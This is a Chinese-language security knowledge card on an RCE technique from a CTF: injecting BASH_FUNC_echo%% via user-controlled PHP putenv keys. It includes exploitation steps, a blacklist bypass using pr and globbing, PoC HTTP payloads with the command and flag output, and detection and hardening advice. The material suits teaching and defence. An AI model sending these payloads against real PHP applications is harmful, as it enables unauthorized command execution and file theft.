---
id: web-php-rce-putenv-bash-func-env-injection
title: PHP putenv 注入 BASH_FUNC_ 导出函数执行命令
type: scenario
domain: web
path: web/php/rce
technique: php-putenv-bash-func-injection
aliases:
- BASH_FUNC 环境变量注入
- putenv 命令执行
- Bash 导出函数注入
- BASH_FUNC_echo%% 注入
- PHP 环境变量注入 RCE
- 环境变量劫持 bash 函数
tags:
- php
- rce
- bash
- environment-variable
- putenv
- bash-function
- blacklist-bypass
- glob
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V20
  verified_at: '2026-11-05T02:12:25+08:00'
  notes: 已通读原文并核对8张图：图06 源码显示 foreach(['env']) putenv 且仅校验 value、黑名单含单字母 f/l/a/g 与符号；图07 env[BASH_FUNC_echo%%]=() { id; } 回显 uid=33(www-data)，图08 dir / 列出根目录，图09 pr -T /*1* 读出 FLAG{XJ_oln2F63larlvdu9I}，与卡内原理/步骤/PoC 完全一致。CTF 环境，无产品版本/CVE；frontmatter 无 sources/source_url；PoC 未在本机复跑。
---

## 一句话结论

当 PHP 代码把用户可控的键和值传入 `putenv("$key=$value")`，且之后会启动 bash 子进程时，攻击者可设置 `BASH_FUNC_<命令>%%=() { 恶意命令; }`，让 bash 启动时把该值导入为导出函数；应用随后调用 `<命令>`（如 `echo`）时就会执行攻击者命令，从而在仅过滤值的黑名单下实现命令执行与任意文件读取。

## 原理

- Bash 支持通过环境变量导出函数：`export -f name` 会产生形如 `BASH_FUNC_name%%=() { ...; }` 的环境变量。任何子 bash 启动时都会解析并导入这些函数，函数表优先于外部命令。
- PHP 的 `putenv()` 可以设置任意名称的环境变量（名称由调用方拼接）。如果键来自用户且没有校验，攻击者可以让键为 `BASH_FUNC_echo%%`、值为 `() { id; }`。
- 之后应用若通过 `system()`、`shell_exec()`、`popen()`、反引号或包含的脚本调用 bash，并执行了 `echo`，bash 会先命中导入的函数，执行函数体中的命令，而不是真正的 `/bin/echo`。
- 本例的过滤只检查**值**，且黑名单包含大量单字母（`f`、`l`、`a`、`g`、`x` 等）和符号。攻击者用 `pr`（打印文件）代替 `cat`，用 `-T` 大写参数，用 glob `/*1*` 匹配未知完整文件名 `/f1ag`，从而让值中不出现任何被禁字符；键完全不受检查，是绕过点。
- 该技巧与 Shellshock 利用的是同一套“环境变量导入 bash 函数”机制，但注入点是 PHP `putenv`，不是 HTTP 头。

## 触发条件

- PHP 应用存在把用户输入作为 `putenv` 键/值拼接的代码（例如 `foreach ($_REQUEST['env'] as $k => $v) putenv("$k=$v")`），且只过滤值、不校验键；
- 应用在 `putenv` 之后会启动 bash（`/bin/sh` 指向 bash，或显式调用 bash）；若为 dash 则不会导入 `BASH_FUNC_` 函数；
- bash 版本支持导出函数环境变量格式（现代 bash 使用 `BASH_FUNC_name%%`）；
- 攻击者能控制键名中的 `%`（HTTP 表单需 URL 编码为 `%25`）。

## 利用步骤

1. 确认注入点：提交 `env[BASH_FUNC_echo%%]=() { id; }`，观察响应是否出现 `uid=...`。
2. 若命令回显可见，先列目录确认目标文件：`env[BASH_FUNC_echo%%]=() { dir /; }`（`dir` 不含黑名单字符）。
3. 用未过滤的读文件命令读取目标：`env[BASH_FUNC_echo%%]=() { pr -T /*1*; }`。
4. 文件名不确定时用 glob：`/*1*` 匹配根目录下包含 `1` 的文件（如 `/f1ag`），避免直接写出被禁字符。
5. 若需要更复杂命令，可继续用不触发黑名单的二进制与通配符组合，或通过函数体执行多条命令。

## PoC

```http
POST /adca4977cb42016071530fb8888105c7.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

env%5BBASH_FUNC_echo%25%25%5D=()%20%7B%20id%3B%20%7D
```

```text
# 响应中出现：
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```http
# 列根目录
env[BASH_FUNC_echo%%]=() { dir /; }

# 读取根目录下文件名含 1 的文件（如 /f1ag）
env[BASH_FUNC_echo%%]=() { pr -T /*1*; }
```

```text
# 响应示例：
FLAG{XJ_oln2F63larlvdu9I}
```

## 变体与关联

- 变体：函数名不限于 `echo`，可覆盖应用实际调用的任意命令（`id`、`whoami`、业务脚本名等）；只要能预测 bash 会执行哪个命令即可。
- 变体：若 `putenv` 的键有前缀/后缀限制，可尝试其它能落入环境变量的参数；若值过滤更严，可用 `$'\x..'`、变量拼接、通配符等方式绕过（视过滤规则）。
- 关联：[[pentest-privilege-escalation-suid-bash-function-hijack]]（Bash 导出函数机制的本地提权用法）；[[web-php-rce-disable-functions-ld-preload]]（另一种通过环境变量影响子进程的 PHP RCE 手法）。
- 边界：`/bin/sh` 为 dash、bash 启动时清理环境（`env -i`）、应用不调用 bash、或 `putenv` 键被白名单限制时失效。

## 检测与防御

- 检测：请求参数中出现 `BASH_FUNC_`、`%%`、`() {` 等特征；PHP 进程环境变量出现异常函数定义；Web 进程子 shell 执行了非预期命令；响应中回显 `uid=`、目录列表或文件内容。
- 修复：禁止把用户输入用作 `putenv` 的键；对键和值都做严格白名单；不要用 `putenv` 传递用户数据。
- 加固：启动子进程前清理环境（`env -i`、unset `BASH_FUNC_*`）；避免通过 shell 执行命令，改用参数数组形式；禁用不必要的 `putenv`/`system` 等函数；WAF 拦截 `BASH_FUNC_` 与函数定义语法。
